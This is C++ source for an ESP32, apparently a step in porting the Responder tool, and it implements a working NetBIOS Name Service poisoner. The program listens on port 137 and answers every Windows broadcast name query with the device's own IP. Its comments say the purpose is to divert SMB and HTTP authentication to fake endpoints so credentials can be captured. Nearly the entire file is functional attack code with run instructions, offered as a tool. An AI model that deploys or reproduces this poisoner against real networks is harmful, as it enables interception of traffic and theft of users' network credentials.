// rESPonder32 — Step 2: NBT-NS Poisoner
//
// Binds to 0.0.0.0:137, receives NetBIOS Name Service broadcast queries, and
// replies with our IP for every name. Windows falls back to NBT-NS when DNS
// and LLMNR both fail (or when LLMNR is disabled). Capturing these steers
// SMB/HTTP auth connections to our fake endpoints (later steps).
//
// Protocol: RFC 1001/1002 — NetBIOS over TCP/IP Name Service
// Packet format: DNS-inspired but uses NetBIOS first-level name encoding
//                (each byte split into nibbles, each nibble + 'A')
//
// IMPORTANT: port 137 is privileged on Linux. Run with sudo in the emulator:
//   cd /home/machine/esp32emu && sudo ./esp32emu run examples/nbtns_poisoner.cpp
//
// On real ESP32: no privilege required — bind directly in setup().

#include <Arduino.h>
#include <WiFi.h>
#include <WiFiUDP.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

// ---------------------------------------------------------------------------
// Config
// ---------------------------------------------------------------------------

static const char*   WIFI_SSID  = "YourSSID";
static const char*   WIFI_PASS  = "YourPassword";
static const uint16_t NBTNS_PORT = 137;

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------

WiFiUDP nbtUDP;
static uint8_t ourIP[4] = {127, 0, 0, 1};

// ---------------------------------------------------------------------------
// IP detection (same trick as LLMNR step)
// ---------------------------------------------------------------------------

static void detectHostIP(uint8_t out[4]) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    if (s < 0) return;
    struct sockaddr_in dst{};
    dst.sin_family      = AF_INET;
    dst.sin_port        = htons(53);
    inet_pton(AF_INET, "8.8.8.8", &dst.sin_addr);
    if (connect(s, (struct sockaddr*)&dst, sizeof(dst)) == 0) {
        struct sockaddr_in local{};
        socklen_t len = sizeof(local);
        if (getsockname(s, (struct sockaddr*)&local, &len) == 0) {
            uint8_t* b = (uint8_t*)&local.sin_addr.s_addr;
            out[0] = b[0]; out[1] = b[1]; out[2] = b[2]; out[3] = b[3];
        }
    }
    close(s);
}

// ---------------------------------------------------------------------------
// NetBIOS name codec
// ---------------------------------------------------------------------------

// Decode the 32-byte first-level encoded name starting at buf[offset] into a
// plain 16-byte NetBIOS name (last byte is the suffix/type byte).
// Returns false if the length prefix is wrong or there's not enough data.
static bool decodeNBTName(const uint8_t* buf, int len, int offset,
                           char decoded[17]) {
    if (offset >= len) return false;
    if (buf[offset] != 0x20) return false;  // must be 32-byte encoded name
    if (offset + 1 + 32 + 1 > len) return false;  // need 34 more bytes

    const uint8_t* enc = buf + offset + 1;
    for (int i = 0; i < 16; i++) {
        uint8_t hi = enc[i * 2]     - 'A';
        uint8_t lo = enc[i * 2 + 1] - 'A';
        decoded[i] = (char)((hi << 4) | lo);
    }
    decoded[16] = '\0';
    return true;
}

// Extract a human-readable name from the decoded 16-byte NetBIOS name.
// The last byte is the suffix (service type). Trims trailing spaces.
static void prettyNBTName(const char decoded[17], char out[20]) {
    // Copy the first 15 bytes (name proper), strip trailing spaces
    int end = 14;
    while (end > 0 && decoded[end] == ' ') end--;
    int i = 0;
    for (; i <= end; i++) out[i] = decoded[i];
    // Append suffix as hex so it's visible in logs
    snprintf(out + i, 20 - i, "<%02X>", (uint8_t)decoded[15]);
}

// Locate the question name in an NBT-NS packet.
// Returns the offset of the first byte of the name field (should be the 0x20
// length byte), which starts at byte 12. Returns -1 if the packet is too short.
static int findNameOffset(int len) {
    if (len < 12 + 34 + 4) return -1;  // header + name + QTYPE + QCLASS
    return 12;
}

// ---------------------------------------------------------------------------
// Packet builder
// ---------------------------------------------------------------------------

// Build an NBT-NS Positive Name Query Response into dst.
// Returns bytes written, or -1 if the query is malformed or not a NB query.
static int buildNBTNSResponse(const uint8_t* query, int qlen,
                               uint8_t* dst,  int dstmax,
                               const uint8_t* our_ip4) {
    if (qlen < 12) return -1;

    uint16_t flags = ((uint16_t)query[2] << 8) | query[3];

    // Responder checks data[2:4] == b'\x01\x10' exactly.
    // 0x0110 = QR=0, Opcode=0, RD=1, B=1: a broadcast name query from Windows.
    // Ignoring everything else avoids responding to unicast NBT-NS traffic
    // (WINS server traffic, redirector queries, etc.) on the same port.
    if (flags != 0x0110) return -1;

    // Locate name (starts at byte 12, length-prefixed 0x20)
    int name_off = findNameOffset(qlen);
    if (name_off < 0) return -1;
    if (query[name_off] != 0x20) return -1;

    // 34 bytes of name (0x20 + 32 encoded bytes + 0x00 terminator)
    static const int NAME_WIRE_LEN = 34;
    int qtype_off = name_off + NAME_WIRE_LEN;
    if (qtype_off + 4 > qlen) return -1;

    uint16_t qtype = ((uint16_t)query[qtype_off] << 8) | query[qtype_off + 1];
    if (qtype != 0x0020) return -1;  // only handle NB (0x0020)

    int w = 0;
    auto put16 = [&](uint16_t v) {
        if (w + 2 <= dstmax) { dst[w++] = (uint8_t)(v >> 8); dst[w++] = (uint8_t)(v & 0xFF); }
    };
    auto put32 = [&](uint32_t v) {
        put16((uint16_t)(v >> 16)); put16((uint16_t)(v & 0xFFFF));
    };
    auto putBuf = [&](const uint8_t* src, int n) {
        for (int i = 0; i < n && w < dstmax; i++) dst[w++] = src[i];
    };

    // Response header
    // Transaction ID echoed from query[0..1]
    dst[w++] = query[0]; dst[w++] = query[1];
    put16(0x8500);  // Flags: QR=1, AA=1, RCODE=0
    put16(0);       // QDCOUNT = 0 (no question section in response)
    put16(1);       // ANCOUNT = 1
    put16(0);       // NSCOUNT = 0
    put16(0);       // ARCOUNT = 0

    // Answer name — same 34 bytes as the query name
    putBuf(query + name_off, NAME_WIRE_LEN);

    // Resource record fields
    put16(0x0020);      // TYPE = NB
    put16(0x0001);      // CLASS = IN
    put32(0x000493E0);  // TTL = 300000 s (matches Responder behaviour)
    put16(6);           // RDLENGTH = 6
    put16(0x0000);      // NB_FLAGS: unique name, B-node
    putBuf(our_ip4, 4); // NB_ADDRESS = our IP

    return w;
}

// ---------------------------------------------------------------------------
// Arduino entry points
// ---------------------------------------------------------------------------

void setup() {
    Serial.begin(115200);
    Serial.println("\n[rESPonder32] NBT-NS Poisoner v0.1");

    WiFi.mode(WIFI_STA);
    WiFi.begin(WIFI_SSID, WIFI_PASS);
    Serial.print("[rESPonder32] Connecting to WiFi");
    while (WiFi.status() != WL_CONNECTED) {
        delay(100);
        Serial.print('.');
    }
    Serial.println();

    detectHostIP(ourIP);
    Serial.printf("[rESPonder32] Host IP: %d.%d.%d.%d\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3]);

    if (!nbtUDP.beginLAN(NBTNS_PORT)) {
        Serial.println("[rESPonder32] ERROR: failed to bind port 137");
        Serial.println("[rESPonder32] Try: sudo ./esp32emu run examples/nbtns_poisoner.cpp");
        return;
    }

    Serial.println("[rESPonder32] Listening on 0.0.0.0:137 (NBT-NS)");
    Serial.println("[rESPonder32] Poisoning all NBT-NS queries -> ready");
}

void loop() {
    int plen = nbtUDP.parsePacket();
    if (plen <= 0) {
        delay(1);
        return;
    }

    uint8_t buf[512];
    int n = nbtUDP.read(buf, sizeof(buf));
    if (n < 12) return;

    IPAddress src     = nbtUDP.remoteIP();
    uint16_t  srcPort = nbtUDP.remotePort();

    uint16_t flags = ((uint16_t)buf[2] << 8) | buf[3];
    if (flags != 0x0110) return;  // only broadcast name queries

    // Decode name for logging
    char decoded[17] = {};
    char pretty[20]  = "(unknown)";
    if (decodeNBTName(buf, n, 12, decoded))
        prettyNBTName(decoded, pretty);

    Serial.printf("[NBT-NS] Query from %d.%d.%d.%d:%d for '%s'\n",
                  src[0], src[1], src[2], src[3], srcPort, pretty);

    uint8_t resp[512];
    int rlen = buildNBTNSResponse(buf, n, resp, sizeof(resp), ourIP);
    if (rlen <= 0) {
        Serial.println("[NBT-NS] Skipped (not a NB query, or parse error)");
        return;
    }

    nbtUDP.beginPacket(src, srcPort);
    nbtUDP.write(resp, (size_t)rlen);
    nbtUDP.endPacket();

    Serial.printf("[NBT-NS] Poisoned -> %d.%d.%d.%d (%d bytes)\n",
                  ourIP[0], ourIP[1], ourIP[2], ourIP[3], rlen);
}
